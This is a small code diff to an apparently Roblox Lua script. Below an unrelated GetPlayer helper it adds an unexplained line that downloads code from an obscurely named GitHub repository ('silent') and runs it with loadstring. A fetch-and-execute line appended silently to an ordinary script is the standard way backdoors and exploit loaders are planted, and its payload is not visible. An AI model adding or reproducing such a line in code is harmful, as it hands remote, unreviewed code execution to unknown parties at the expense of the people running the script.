@@ -48,3 +48,6 @@ function GetPlayer(String)
         end
     return plr
 end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
